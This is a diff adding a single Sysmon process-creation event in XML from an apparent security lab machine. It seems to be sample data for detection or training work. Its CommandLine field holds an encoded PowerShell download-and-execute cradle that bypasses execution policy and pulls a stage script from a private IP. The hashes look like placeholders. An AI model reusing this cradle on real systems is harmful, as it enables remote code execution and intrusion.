@@ -1,0 +1,35 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770795f-9241-49d7-8629-d6b0a06b2b62}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-09-18T08:45:12.1092830Z"/>
+    <EventRecordID>41029</EventRecordID>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN10-SEC-LAB</Computer>
+    <Security UserID="S-1-5-21-392817293-1827491-1001"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2026-09-18 08:45:12.109</Data>
+    <Data Name="ProcessGuid">{5770795f-a1b2-66f8-1200-000000000400}</Data>
+    <Data Name="ProcessId">4812</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADANAB4ADUANgAuADEAMAA1AC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==</Data>
+    <Data Name="CurrentDirectory">C:\Users\Student\Downloads\</Data>
+    <Data Name="User">WIN10-SEC-LAB\Student</Data>
+    <Data Name="LogonGuid">{5770795f-9b11-66f8-e703-000000000000}</Data>
+    <Data Name="LogonId">0x3e703</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">MD5=A1B2C3D4E5F60718293A4B5C6D7E8F90,SHA256=8F9A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8C7D6E5F4A3B2C1D0E9F8A</Data>
+    <Data Name="ParentProcessGuid">{5770795f-a1b0-66f8-1000-000000000400}</Data>
+    <Data Name="ParentProcessId">3204</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+  </EventData>
+</Event>
